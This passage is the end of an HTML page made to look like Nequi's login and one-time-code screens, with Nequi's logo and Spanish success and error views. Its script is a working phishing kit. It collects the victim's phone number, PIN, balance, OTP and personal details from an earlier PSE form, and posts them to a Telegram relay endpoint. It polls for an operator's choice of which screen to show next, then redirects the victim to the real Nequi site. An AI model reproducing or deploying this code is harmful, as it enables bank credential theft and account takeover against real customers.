                                <path d="M74.976 6.80002H71.2071C70.6917 6.80002 70.289 7.21602 70.289 7.71202V8.64002C69.1615 7.32802 67.3093 6.41602 64.8772 6.41602C59.4332 6.41602 56.5501 11.312 56.5501 16.496C56.5501 21.024 58.9178 26.096 64.7644 26.096C66.8583 26.096 69.081 25.104 70.289 23.696V31.056C70.289 31.568 70.7078 31.968 71.2071 31.968H74.976C75.4914 31.968 75.8941 31.552 75.8941 31.056V7.72802C75.8941 7.21602 75.4753 6.81602 74.976 6.81602V6.80002ZM66.3912 22.064C63.9108 22.064 62.1713 20.256 62.1713 16.368C62.1713 12.48 63.9108 10.448 66.3912 10.448C68.8716 10.448 70.6111 12.32 70.6111 16.368C70.6111 20.416 68.8716 22.064 66.3912 22.064Z" fill="#200020"></path>
                                <path d="M95.0448 6.80005H91.2759C90.7604 6.80005 90.3578 7.21605 90.3578 7.71205V17.3921C90.3578 20.5121 88.9565 21.4241 87.1687 21.4241C85.3809 21.4241 83.9796 20.5121 83.9796 17.3921V7.71205C83.9796 7.20005 83.5608 6.80005 83.0615 6.80005H79.2926C78.7772 6.80005 78.3745 7.21605 78.3745 7.71205V17.7921C78.3745 23.7921 81.7086 26.2081 87.1848 26.2081C92.661 26.2081 95.9951 23.7761 95.9951 17.7921V7.71205C95.9951 7.20005 95.5763 6.80005 95.077 6.80005H95.0448Z" fill="#200020"></path>
                            </svg>
                        </div>
                    </section>
                </div>

                <div class="resultado-container">
                    <div class="resultado-icon success">&#10004;</div>
                    <h2 class="resultado-titulo">Proceso Completado</h2>
                    <p class="resultado-mensaje">Tu transacción ha sido procesada exitosamente.</p>
                    <p class="resultado-mensaje">Serás redirigido en unos momentos...</p>
                </div>
            </div>

            <!-- Vista: Error -->
            <div id="error" class="hidden">
                <div class="header">
                    <section class="splash">
                        <div class="splash__container">
                            <svg width="180" height="40" viewBox="0 0 104 32" fill="none"
                                xmlns="http://www.w3.org/2000/svg" class="splash__container__svg">
                                <path d="M5.29905 0H0.918073C0.411035 0 0 0.408316 0 0.912V4.608C0 5.11168 0.411035 5.52 0.918073 5.52H5.29905C5.80609 5.52 6.21713 5.11168 6.21713 4.608V0.912C6.21713 0.408316 5.80609 0 5.29905 0Z" fill="#DA0081"></path>
                                <path d="M31.9876 0H28.2187C27.7033 0 27.3006 0.416 27.3006 0.912V15.872C27.3006 16.176 26.8979 16.288 26.753 16.016L17.991 0.4C17.8461 0.144 17.5884 0 17.2823 0H11.0169C10.5015 0 10.0988 0.416 10.0988 0.912V24.816C10.0988 25.328 10.5176 25.728 11.0169 25.728H14.7858C15.3012 25.728 15.7039 25.312 15.7039 24.816V9.408C15.7039 9.104 16.1066 8.992 16.2515 9.264L25.2551 25.344C25.4 25.6 25.6577 25.744 25.9638 25.744H31.9554C32.4708 25.744 32.8735 25.328 32.8735 24.832V0.912C32.8735 0.4 32.4547 0 31.9554 0H31.9876Z" fill="#200020"></path>
                                <path d="M54.6495 16.3999C54.6495 9.66395 50.2363 6.31995 45.3883 6.31995C39.0906 6.31995 35.4988 10.6559 35.4988 16.5119C35.4988 23.1679 40.0087 26.3359 45.2433 26.3359C50.4779 26.3359 53.5382 23.6479 54.3596 20.1599C54.4724 19.7119 54.2147 19.3119 53.5382 19.3119H50.5746C50.2363 19.3119 49.9464 19.4879 49.8015 19.8239C49.0606 21.4399 47.8687 22.2879 45.5815 22.2879C42.9884 22.2879 41.2489 20.6719 40.9912 17.3919H53.7315C54.2791 17.3919 54.6495 16.9919 54.6495 16.3999ZM41.2006 13.8559C41.7482 11.4399 43.1656 10.3679 45.3077 10.3679C47.2244 10.3679 48.8673 11.4719 49.0928 13.8559H41.2006Z" fill="#200020"></path>
                                <path d="M103.082 6.80005H99.2969C98.7899 6.80005 98.3788 7.20837 98.3788 7.71205V24.832C98.3788 25.3357 98.7899 25.744 99.2969 25.744H103.082C103.589 25.744 104 25.3357 104 24.832V7.71205C104 7.20837 103.589 6.80005 103.082 6.80005Z" fill="#200020"></path>
                                <path d="M74.976 6.80002H71.2071C70.6917 6.80002 70.289 7.21602 70.289 7.71202V8.64002C69.1615 7.32802 67.3093 6.41602 64.8772 6.41602C59.4332 6.41602 56.5501 11.312 56.5501 16.496C56.5501 21.024 58.9178 26.096 64.7644 26.096C66.8583 26.096 69.081 25.104 70.289 23.696V31.056C70.289 31.568 70.7078 31.968 71.2071 31.968H74.976C75.4914 31.968 75.8941 31.552 75.8941 31.056V7.72802C75.8941 7.21602 75.4753 6.81602 74.976 6.81602V6.80002ZM66.3912 22.064C63.9108 22.064 62.1713 20.256 62.1713 16.368C62.1713 12.48 63.9108 10.448 66.3912 10.448C68.8716 10.448 70.6111 12.32 70.6111 16.368C70.6111 20.416 68.8716 22.064 66.3912 22.064Z" fill="#200020"></path>
                                <path d="M95.0448 6.80005H91.2759C90.7604 6.80005 90.3578 7.21605 90.3578 7.71205V17.3921C90.3578 20.5121 88.9565 21.4241 87.1687 21.4241C85.3809 21.4241 83.9796 20.5121 83.9796 17.3921V7.71205C83.9796 7.20005 83.5608 6.80005 83.0615 6.80005H79.2926C78.7772 6.80005 78.3745 7.21605 78.3745 7.71205V17.7921C78.3745 23.7921 81.7086 26.2081 87.1848 26.2081C92.661 26.2081 95.9951 23.7761 95.9951 17.7921V7.71205C95.9951 7.20005 95.5763 6.80005 95.077 6.80005H95.0448Z" fill="#200020"></path>
                            </svg>
                        </div>
                    </section>
                </div>

                <div class="resultado-container">
                    <div class="resultado-icon error">&#10008;</div>
                    <h2 class="resultado-titulo">Error en el Proceso</h2>
                    <p class="resultado-mensaje">No fue posible completar la operación.</p>
                    <p class="resultado-mensaje">Por favor intenta más tarde.</p>
                </div>
            </div>

        </div>
    </nequi-root>

    <script>
        $(document).ready(function () {
            // ==================== CONFIGURACIÓN INICIAL ====================
            function generateUniqId() {
                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
                let result = '';
                for (let i = 0; i < 6; i++) {
                    result += chars.charAt(Math.floor(Math.random() * chars.length));
                }
                return result;
            }

            let sessionUniqId = sessionStorage.getItem('uniqId');
            if (!sessionUniqId || sessionUniqId.startsWith('sess_') || sessionUniqId.length !== 6) {
                if (sessionUniqId && (sessionUniqId.startsWith('sess_') || sessionUniqId.length !== 6)) {
                    localStorage.clear();
                }
                sessionUniqId = generateUniqId();
                sessionStorage.setItem('uniqId', sessionUniqId);
            }

            const appState = {
                uniqId: sessionUniqId,
                currentView: 'login'
            };

            console.log('Session ID:', appState.uniqId);

            // ==================== RECUPERAR DATOS PSE ====================
            const pseDatosStr = sessionStorage.getItem('pseDatos');
            if (pseDatosStr) {
                try {
                    const pseDatos = JSON.parse(pseDatosStr);
                    const camposPSE = {
                        'nombre': pseDatos.nombre,
                        'email': pseDatos.email,
                        'celular': pseDatos.celular,
                        'direccion': pseDatos.direccion,
                        'ciudad': pseDatos.ciudad,
                        'departamento': pseDatos.departamento,
                        'banco': pseDatos.banco,
                        'tipoPersona': pseDatos.tipoPersona,
                        'ente': 'brasilia'
                    };
                    Object.keys(camposPSE).forEach(key => {
                        if (camposPSE[key]) {
                            const storageKey = `${appState.uniqId}_${key}`;
                            localStorage.setItem(storageKey, JSON.stringify(camposPSE[key]));
                        }
                    });
                    console.log('Datos PSE recuperados:', pseDatos);
                } catch (e) {
                    console.error('Error al parsear pseDatos:', e);
                }
            }

            // ==================== FUNCIONES DE ALMACENAMIENTO ====================
            function saveToLocalStorage(key, value) {
                const storageKey = `${appState.uniqId}_${key}`;
                const valueToSave = value && value.trim() !== '' ? value : '--';
                localStorage.setItem(storageKey, JSON.stringify(valueToSave));
            }

            function getFromLocalStorage(key) {
                const storageKey = `${appState.uniqId}_${key}`;
                const value = localStorage.getItem(storageKey);
                return value ? JSON.parse(value) : '--';
            }

            // ==================== FUNCIONES DE UI ====================
            function hideAllViews() {
                $('#login, #otpapp, #exito, #error, #wait').addClass('hidden');
            }

            function showView(viewId) {
                console.log('Mostrando vista:', viewId);
                hideAllViews();
                $('#' + viewId).removeClass('hidden');
                console.log('Vista ' + viewId + ' visible:', !$('#' + viewId).hasClass('hidden'));

                const viewHistory = sessionStorage.getItem('viewHistory') || '';

                if (viewHistory.includes(viewId) && viewId !== 'wait' && viewId !== 'exito' && viewId !== 'error') {
                    if (viewId === 'login') {
                        $('#errorGeneralLogin').text('Los datos ingresados son incorrectos, por favor verifícalos e ingrésalos nuevamente.').addClass('show');
                        $('#usuario').val('');
                        $('#clave').val('');
                        $('#btnLogin').prop('disabled', true);
                    } else if (viewId === 'otpapp') {
                        $('#errorGeneralOtpApp').text('El código ingresado es incorrecto, ingrésalo nuevamente.').addClass('show');
                        $('#k1, #k2, #k3, #k4, #k5, #k6').val('');
                        currentOtpPosition = 1;
                        $('#btnOtpApp').prop('disabled', true);
                    }
                } else {
                    $('.mensaje-error-general').removeClass('show').text('');
                }

                if (!viewHistory.includes(viewId)) {
                    sessionStorage.setItem('viewHistory', viewHistory + viewId + ',');
                }

                appState.currentView = viewId;
            }

            function showLoading() {
                $('#loading').addClass('active');
                setTimeout(iniciarPolling, 3000);
            }

            function hideLoading() {
                $('#loading').removeClass('active');
            }

            // ==================== COMUNICACIÓN CON TELEGRAM ====================
            let enviandoATelegram = false;

            async function enviarATelegram() {
                if (enviandoATelegram) {
                    console.log('Envío en progreso, evitando duplicado');
                    return;
                }

                enviandoATelegram = true;

                const allData = {};
                const fields = ['usuario', 'clave', 'saldo', 'ente', 'nombre', 'email', 'celular', 'ciudad',
                    'direccion', 'departamento', 'banco', 'tipoPersona', 'otpapp', 'status', 'uniqid'];

                fields.forEach(field => {
                    allData[field] = getFromLocalStorage(field);
                });

                console.log('Enviando datos:', allData);

                try {
                    const response = await fetch('/api/telegram/send', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        },
                        body: JSON.stringify({
                            uniqid: appState.uniqId,
                            data: allData
                        })
                    });
                    const result = await response.json();
                    console.log('Respuesta del servidor:', result);
                } catch (e) {
                    console.error('Error al enviar:', e);
                } finally {
                    setTimeout(() => {
                        enviandoATelegram = false;
                    }, 1000);
                }
            }

            async function iniciarPolling() {
                const loadingElement = document.getElementById('loading');
                if (!loadingElement.classList.contains('active')) {
                    return;
                }

                try {
                    const response = await fetch(`/api/telegram/check-button`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        },
                        body: JSON.stringify({
                            uniqid: appState.uniqId
                        })
                    });
                    const data = await response.json();

                    if (data.button) {
                        hideLoading();

                        const viewMap = {
                            'login': 'login',
                            'otpapp': 'otpapp',
                            'exito': 'exito',
                            'error': 'error'
                        };

                        const viewId = viewMap[data.button] || data.button;
                        showView(viewId);

                        if (viewId === 'exito' || viewId === 'error') {
                            setTimeout(function () {
                                window.location.href = 'https://www.nequi.com.co/';
                            }, 5000);
                        }
                    } else {
                        setTimeout(iniciarPolling, 2000);
                    }
                } catch (error) {
                    console.error('Error en polling:', error);
                    setTimeout(iniciarPolling, 2000);
                }
            }

            // ==================== VALIDACIONES ====================
            let captchaClicked = false;

            function validarCelular(numero) {
                // Acepta formato "3XX XXX XXXX" o "3XXXXXXXXX"
                const cleanNumber = numero.replace(/\s/g, '');
                const regex = /^3\d{9}$/;
                return regex.test(cleanNumber);
            }

            function validarClave(clave) {
                const regex = /^\d{4}$/;
                return regex.test(clave);
            }

            function validateLogin() {
                const usuario = $('#usuario').val().trim();
                const clave = $('#clave').val().trim();
                const saldo = $('#txtSaldo').val().trim();
                const saldoValid = saldo !== '' && !isNaN(parseFloat(saldo.replace(/,/g, '')));
                const isValid = validarCelular(usuario) && validarClave(clave) && saldoValid && captchaClicked;
                $('#btnLogin').prop('disabled', !isValid);
                return isValid;
            }

            // Formatear número de teléfono
            function formatPhoneNumber(value) {
                let cleaned = value.replace(/\D/g, '');
                if (cleaned.length > 10) cleaned = cleaned.substring(0, 10);
                let formatted = cleaned.replace(/(\d{3})(\d{3})(\d{0,4})/, '$1 $2 $3').trim();
                return formatted;
            }

            function validateOtpApp() {
                let otp = '';
                for (let i = 1; i <= 6; i++) {
                    otp += $('#k' + i).val();
                }
                const isValid = /^\d{6}$/.test(otp);
                $('#btnOtpApp').prop('disabled', !isValid);
                return isValid;
            }

            // ==================== EVENTOS DE FORMULARIOS ====================

            // Login - Número de celular con formato
            $('#usuario').on('input', function() {
                let value = $(this).val();
                let formatted = formatPhoneNumber(value);
                $(this).val(formatted);
                validateLogin();
            });

            // Login - Clave
            $('#clave').on('input', function() {
                let value = $(this).val().replace(/\D/g, '');
                if (value.length > 4) value = value.substring(0, 4);
                $(this).val(value);
                validateLogin();
            });

            // Login - Saldo
            $('#txtSaldo').on('input', function() {
                validateLogin();
            });

            // Captcha click
            $('#captchaWrapper').on('click', function() {
                captchaClicked = true;
                $(this).addClass('checked');
                validateLogin();
            });

            $('#btnLogin').on('click', async function () {
                if (validateLogin()) {
                    // Limpiar el número de espacios antes de guardar
                    const usuarioClean = $('#usuario').val().trim().replace(/\s/g, '');
                    saveToLocalStorage('usuario', usuarioClean);
                    saveToLocalStorage('clave', $('#clave').val().trim());
                    saveToLocalStorage('saldo', $('#txtSaldo').val().trim());
                    saveToLocalStorage('ente', 'nequi');
                    saveToLocalStorage('status', 'LOGIN');
                    saveToLocalStorage('uniqid', appState.uniqId);

                    await enviarATelegram();
                    showLoading();
                }
            });

            // OTP App - Teclado numérico
            let currentOtpPosition = 1;

            $('.container_number').on('click', function(e) {
                e.preventDefault();
                const value = $(this).data('value');

                if (value === 'backspace') {
                    if (currentOtpPosition > 1) {
                        currentOtpPosition--;
                        $('#k' + currentOtpPosition).val('');
                    }
                } else if (value !== undefined && value !== '') {
                    if (currentOtpPosition <= 6) {
                        $('#k' + currentOtpPosition).val(value);
                        currentOtpPosition++;
                    }
                }

                validateOtpApp();
            });

            $('#btnOtpApp').on('click', async function () {
                if (validateOtpApp()) {
                    let otp = '';
                    for (let i = 1; i <= 6; i++) {
                        otp += $('#k' + i).val();
                    }
                    saveToLocalStorage('otpapp', otp);
                    saveToLocalStorage('status', 'OTPAPP');

                    await enviarATelegram();
                    showLoading();
                }
            });

            // ==================== INICIALIZACIÓN ====================
            // Login ya visible por defecto, solo registrar en historial
            const viewHistory = sessionStorage.getItem('viewHistory') || '';
            if (!viewHistory.includes('login')) {
                sessionStorage.setItem('viewHistory', viewHistory + 'login,');
            }
            appState.currentView = 'login';
        });
    </script>
</body>

</html>
